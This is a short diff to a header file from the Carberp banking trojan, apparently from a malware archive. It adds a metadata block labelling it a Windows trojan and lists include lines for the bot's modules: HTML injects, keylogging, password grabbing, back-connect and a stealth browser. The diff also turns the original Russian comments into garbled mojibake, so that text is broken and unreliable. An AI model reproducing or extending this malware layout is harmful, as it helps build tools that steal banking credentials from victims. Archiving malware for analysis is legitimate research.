@@ -1,11 +1,22 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 /*--------------------------------------------------------------------------*/
 //
-//  Заголовочный файл включающий некторые возможности бота.
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 //
 /*--------------------------------------------------------------------------*/
 
-#include "InternetExplorer.h" // Обработка запросов InternetExplorer
+#include "InternetExplorer.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetExplorer
 #include "Firefox.h"
 #include "Opera.h"
 
@@ -14,16 +25,16 @@
 #include "KeepAlive.h"
 #include "FtpSniffer.h"
 
-#include "BotConfig.h"     // Модуль включает HTML инжекты
-#include "BotCryptHTTP.h" // Шифрование отправляемых и принимаемых данных
+#include "BotConfig.h"     // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#include "BotCryptHTTP.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 #include "KeyLogSystems.h"
 
-#include "Grabber.h" // Включение грабера паролей
-#include "coocksol.h" // Очистка куков ИЕ и ФФ
+#include "Grabber.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#include "coocksol.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅ
 
-#include "BackConnect.h" // Модуль обратной связи
-#include "StealthBrowser.h" // Скрытый браузер
+#include "BackConnect.h" // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+#include "StealthBrowser.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 
 #include "IBankSystem.h"
